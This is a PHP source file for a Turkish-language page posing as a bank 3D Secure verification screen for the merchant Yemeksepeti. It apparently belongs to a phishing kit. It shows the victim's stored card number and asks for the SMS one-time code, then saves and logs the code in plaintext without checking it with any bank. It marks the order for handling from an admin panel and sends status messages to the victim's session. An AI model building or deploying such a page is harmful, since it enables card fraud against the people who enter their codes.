<?php
// Config dosyasını dahil et
include_once('config/config.php');

// Session başlat
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// İşlem ID'sini al
$tID = isset($_GET['t']) ? intval($_GET['t']) : 0;
if (!$tID) {
    header('Location: index.php');
    exit;
}

// İşlemi kontrol et
try {
    $stmt = $pdo->prepare('
        SELECT t.*, o.id as order_id, o.total as amount, o.first_name, o.last_name, o.created_at, p.card_number 
        FROM threeds t 
        JOIN orders o ON t.order_id = o.id 
        LEFT JOIN payment_data p ON o.id = p.order_id
        WHERE t.id = ?
    ');
    $stmt->execute([$tID]);
    $transaction = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$transaction) {
        header('Location: index.php');
        exit;
    }
} catch (PDOException $e) {
    error_log('3D Secure Error: ' . $e->getMessage());
    header('Location: index.php');
    exit;
}

$error = isset($_GET['error']) ? (int)$_GET['error'] : 0;

// Form gönderimini işle
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['code'])) {
    $code = trim($_POST['code']);
    
    // Debug bilgisi
    error_log("3D Code received for transaction ID " . $tID . ": " . $code);
    
    if (strlen($code) !== 6 || !ctype_digit($code)) {
        // Geçersiz kod formatı: Hata parametresi ekle
        header('Location: 3dsecure.php?t=' . $tID . '&error=1');
        exit;
    }
    
    try {
        // 3D Secure kaydını güncelle: kod, status ve doğrulama zamanı
        $stmt = $pdo->prepare('UPDATE threeds SET code = ?, status = ?, verified_at = NOW() WHERE id = ?');
        $stmt->execute([$code, 'verified', $tID]);
        
        // Ödeme doğrulaması başarılı ise (GREAT işaretlemesini kaldıralım, admin panelinden yapılacak)
        // $stmt = $pdo->prepare('UPDATE orders SET payment_status = ? WHERE id = ?');
        // $stmt->execute(['GREAT', $transaction['order_id']]);
        
        // 3D verified durumunu kaydet, ama payment_status'ü değiştirme
        $stmt = $pdo->prepare('UPDATE orders SET payment_status = ? WHERE id = ?');
        $stmt->execute(['processing', $transaction['order_id']]);
        
        // Müşteri session tablosunda da kodu güncelle
        try {
            $stmt = $pdo->prepare('SELECT id FROM customer_session WHERE order_id = ?');
            $stmt->execute([$transaction['order_id']]);
            $session = $stmt->fetch();
            
            if ($session) {
                $stmt = $pdo->prepare('UPDATE customer_session SET payment_message = ? WHERE order_id = ?');
                $stmt->execute(['3D Doğrulama tamamlandı, işleminiz kontrol ediliyor...', $transaction['order_id']]);
            }
        } catch (Exception $e) {
            error_log('Customer session update error: ' . $e->getMessage());
        }
        
        // Log bilgisi
        error_log("3D Code verified. Redirecting to payment_processing.php?t=" . $tID);
        
        // Payment processing sayfasına yönlendir
        ?>
        <script>
        // Yönlendirme işlemini JavaScript ile yap
        window.location.href = 'payment_processing.php?t=<?php echo $tID; ?>';
        </script>
        <?php
        // Yönlendirme için header da kullan (JavaScript çalışmazsa)
        header('Location: payment_processing.php?t=' . $tID);
        exit;
        
    } catch (PDOException $e) {
        error_log('3D Secure Verification Error: ' . $e->getMessage());
        header('Location: 3dsecure.php?t=' . $tID . '&error=2');
        exit;
    }
}

// Kart numarasını maskele (sadece son 4 haneyi göster; orta kısmı yıldızlarla gizler)
function maskCardNumber($number) {
    $number = preg_replace('/[^0-9]/', '', $number);
    $length = strlen($number);
    if ($length < 4) return $number;
    return substr($number, 0, 6) . str_repeat('*', $length - 10) . substr($number, -4);
}

// Nonce değeri oluştur (Inline script için)
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'self' 'nonce-{$nonce}' https://code.jquery.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com");
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>3D Secure Doğrulama</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
    
    <style>
        :root {
            --primary-color: #0052cc;
            --secondary-color: #0065ff;
            --error-color: #dc3545;
        }
        
        body {
            background-color: #f8f9fa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .card {
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            max-width: 500px;
            width: 100%;
        }
        
        .card-header {
            background-color: var(--primary-color);
            color: white;
            padding: 1.5rem;
            text-align: center;
            position: relative;
        }
        
        .header-logo {
            position: absolute;
            top: 1.5rem;
            left: 1.5rem;
        }
        
        .header-logo img {
            height: 40px;
        }
        
        .secure-badge {
            position: absolute;
            top: 1.5rem;
            right: 1.5rem;
            font-size: 1.5rem;
        }
        
        .card-body {
            padding: 2rem;
        }
        
        .transaction-info {
            background-color: #f2f7ff;
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .transaction-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }
        
        .transaction-label {
            color: #666;
            font-weight: 500;
        }
        
        .transaction-value {
            font-weight: 600;
            text-align: right;
        }
        
        .card-info {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid #eee;
        }
        
        .card-icon {
            font-size: 2rem;
            margin-right: 1rem;
            color: var(--primary-color);
        }
        
        .card-details .card-number {
            font-size: 1.1rem;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 0.25rem rgba(0, 82, 204, 0.25);
        }
        
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 0.6rem 2rem;
            font-weight: 500;
            border-radius: 5px;
        }
        
        .btn-primary:hover {
            background-color: var(--secondary-color);
            border-color: var(--secondary-color);
        }
        
        .error-message {
            color: var(--error-color);
            margin-top: 0.5rem;
            font-weight: 500;
        }
        
        .otp-info {
            margin-bottom: 1.5rem;
            padding: 1rem;
            background-color: #e9ecef;
            border-radius: 5px;
            border-left: 4px solid var(--primary-color);
        }
        
        .timer {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #666;
        }
        
        .timer span {
            font-weight: 600;
            color: var(--primary-color);
        }
        
        .secure-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 1.5rem;
            gap: 1.5rem;
        }
        
        .secure-logos img {
            height: 30px;
            opacity: 0.7;
        }
        
        .code-input {
            letter-spacing: 4px;
            font-size: 1.2rem;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <div class="header-logo">
                    <!-- Doğru yolu kullan veya base64 ile gömme -->
                    <i class="fas fa-university"></i>
                </div>
                <div class="secure-badge">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h4>3D Secure Doğrulama</h4>
                <p class="mb-0">Güvenli Ödeme İşlemi</p>
            </div>
            
            <div class="card-body">
                <div class="transaction-info">
                    <div class="transaction-row">
                        <div class="transaction-label">İşyeri:</div>
                        <div class="transaction-value">Yemeksepeti</div>
                    </div>
                    <div class="transaction-row">
                        <div class="transaction-label">Tutar:</div>
                        <div class="transaction-value"><?php echo number_format($transaction['amount'], 2); ?> TL</div>
                    </div>
                    <div class="transaction-row">
                        <div class="transaction-label">Tarih:</div>
                        <div class="transaction-value"><?php echo date('d.m.Y H:i:s', strtotime($transaction['created_at'])); ?></div>
                    </div>
                    <div class="transaction-row">
                        <div class="transaction-label">İşlem No:</div>
                        <div class="transaction-value">#<?php echo $transaction['order_id']; ?></div>
                    </div>
                </div>
                
                <div class="card-info">
                    <div class="card-icon">
                        <i class="fas fa-credit-card"></i>
                    </div>
                    <div class="card-details">
                        <div class="card-number"><?php echo maskCardNumber($transaction['card_number']); ?></div>
                        <div class="card-holder"><?php echo htmlspecialchars($transaction['first_name'] . ' ' . $transaction['last_name']); ?></div>
                    </div>
                </div>
                
                <div class="otp-info">
                    <p class="mb-0"><i class="fas fa-info-circle me-2"></i> Kartınıza kayıtlı cep telefonunuza gönderilen 6 haneli doğrulama kodunu giriniz.</p>
                </div>
                
                <form method="POST" action="" id="verificationForm">
                    <div class="mb-3">
                        <label for="code" class="form-label">Doğrulama Kodu:</label>
                        <input type="text" class="form-control code-input" id="code" name="code" 
                               maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required 
                               placeholder="******">
                        
                        <?php if ($error === 1): ?>
                        <div class="error-message">
                            <i class="fas fa-exclamation-circle me-1"></i> Geçersiz doğrulama kodu. Lütfen tekrar deneyiniz.
                        </div>
                        <?php elseif ($error === 2): ?>
                        <div class="error-message">
                            <i class="fas fa-exclamation-circle me-1"></i> İşlem sırasında bir hata oluştu. Lütfen tekrar deneyiniz.
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="d-grid gap-2">
                        <button type="submit" class="btn btn-primary">Doğrula</button>
                    </div>
                    
                    <div class="timer" id="countdown">
                        Kalan süre: <span id="timer">03:00</span>
                    </div>
                </form>
                
                <div class="secure-logos">
                    <!-- Logo ikonları -->
                    <i class="fab fa-cc-mastercard fa-2x"></i>
                    <i class="fab fa-cc-visa fa-2x"></i>
                    <i class="fas fa-credit-card fa-2x"></i>
                </div>
            </div>
        </div>
    </div>
    
    <!-- jQuery ve Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- JavaScript kodunu harici bir dosyaya taşı veya nonce ekle -->
    <script src="js/3dsecure.js""></script>
    </script>
</body>
</html>